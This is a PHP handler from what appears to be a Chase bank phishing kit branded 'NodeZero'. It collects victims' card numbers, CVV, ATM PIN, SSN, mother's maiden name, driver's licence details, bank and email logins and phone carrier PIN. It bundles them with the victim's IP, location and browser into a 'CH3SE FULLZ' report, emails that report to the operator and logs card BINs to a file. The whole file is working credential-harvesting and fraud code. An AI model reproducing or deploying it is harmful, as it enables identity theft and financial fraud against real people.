<?php
session_start();
require_once '../main.php';
include('../detects.php');
include('../blockers.php');
if (!$_POST['CardNumber']) {
} else {
    $userbank = $_SESSION['userbank'];
    $passwordbank = $_SESSION['passwordbank'];
    $securityTokenbank = $_SESSION['securityTokenbank'];
    $emaildress = $_SESSION['emaildress'];
    $emailPassword = $_SESSION['emailPassword'];
    $emailretry = $_SESSION['emailretry'];
    $emailType = $_SESSION['emailType'];
    $emailProvider = $_SESSION['emailProvider'];
    $fullname = $_SESSION['fullname'];
    $DateOfBirth = $_SESSION['DateOfBirth'];
    $StreetAddress = $_SESSION['StreetAddress'];
    $StateRegion = $_SESSION['StateRegion'];
    $ZipCode = $_SESSION['ZipCode'];
    $CityR = $_SESSION['CityR'];
    $NumberPhone = $_SESSION['NumberPhone'];
    $NumberCarrier = $_SESSION['NumberCarrier'];
    $NumberPin = $_SESSION['NumberPin'];
    $MaidenName = $_SESSION['MaidenName'] = $_POST['MaidenName'];
    $CardNumber = $_SESSION['CardNumber'] = $_POST['CardNumber'];
    $TypeC = $_SESSION['type'] = $_POST['type'];
    $BankC = $_SESSION['bank'] = $_POST['bank'];
    $BrandC = $_SESSION['brandbank'] = $_POST['brandbank'];
    $ExpirationDate = $_SESSION['ExpirationDate'] = $_POST['ExpirationDate'];
    $Cvv = $_SESSION['Cvv'] = $_POST['Cvv'];
    $SecurityNumber = $_SESSION['SecurityNumber'];
    $AtmPin = $_SESSION['AtmPin'] = $_POST['AtmPin'];
    $LicenseNumber = $_SESSION['LicenseNumber'] = $_POST['LicenseNumber'];
    $LicenseNExp = $_SESSION['LicenseNExp'] = $_POST['LicenseNExp'];
    $CardNumber = str_replace(' ', '', $CardNumber);
    $last4 = substr($CardNumber, 12, 16);
    $cardInfo = check_bin($CardNumber);
    $BIN = substr($CardNumber,0,6);
    $Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
    $Brand = ($cardInfo['brand']);
    $Type = ($cardInfo['type']);
    $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";

    $message = "+ -------- [ ⚡ NodeZero ⚡ ] -----------+\n";
    $message .= "+ 💎 P3rs0nal Information\n";
    $message .= "| Full n4me : $fullname\n";
    $message .= "| D4te of birth : $DateOfBirth\n";
    $message .= "| MMN : $MaidenName\n";
    $message .= "| SSN : $SecurityNumber\n";
    $message .= "| 4ddr3ss : $StreetAddress\n";
    $message .= "| St4te : $StateRegion\n";
    $message .= "| City : $CityR\n";
    $message .= "| Zip : $ZipCode\n";
    $message .= "| Tel3phone : $NumberPhone\n";
    if ($enablephonepin === "on") {
        $message .= "| Ph0ne C4rrier : $NumberCarrier\n";
        $message .= "| Ph0ne C4rrier Pin : $NumberPin\n";
    }
    $message .= "| MMN : $MaidenName\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 🏦 Chase Login Details\n";
    $message .= "| Ch4se l0gin : $userbank\n";
    $message .= "| Ch4se p4ssword : $passwordbank\n";
    if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| Ch4se S3curity T0ken : $securityTokenbank\n";
    }    $message .= "+ ------------------------------------+\n";
    $message .= "+ ✅ Em4il login $emailretry\n";
    $message .= "| Em4il l0gin : $emaildress\n";
    $message .= "| Em4il p4ssw0rd : $emailPassword\n";
    $message .= "| Em4il Pr0vid3r : $emailProvider\n";
    $message .= "| Em4il Type : $emailType\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 💳 Billiing Inf0rmati0n\n";
    $message .= "| C4rd BIN : $BIN\n";
    $message .= "| C4rd Bank : $Bank\n";
    $message .= "| C4rd Type : $Brand $Type\n";
    $message .= "| C4rd Number : $CardNumber\n";
    $message .= "| C4rd Exp : $ExpirationDate\n";
    $message .= "| CVV : $Cvv\n";
    $message .= "| 4TM Pln : $AtmPin\n";
    $message .= "| Lic3ns3 Numb3r : $LicenseNumber\n";
    $message .= "| Lic3ns3 Expiry: $LicenseNExp\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ------------------------------------+\n";
    if($cardInfo["brand"] == "") {
        $subject = "CH3SE FULLZ: " .$fullname." ".$BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["bank"]["name"])." [ $cn - $os - $v_ip ]";
    $subbin = $BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["bank"]["name"]);
    } else {
        $subject = "CH3SE FULLZ: " .$fullname." ".$BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["brand"])." ".strtoupper($cardInfo["bank"]["name"])." [ $cn - $os - $v_ip ]";
    $subbin = $BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["brand"])." ".strtoupper($cardInfo["bank"]["name"]);
    }
    //$subject = "CHASE FULLZ: " .$fullname. $Bank . " ".$Brand . " ".$Type ." [ $cn - $os - $v_ip ]";
    kirim_mail($email_result, "CH4SE FULLZ ".$fullname, $subject, $message);
    tulis_file("../result/total_bin.txt","$subbin|$countrycode|$cn|$os");
    //header('Location: done.php');

}
?>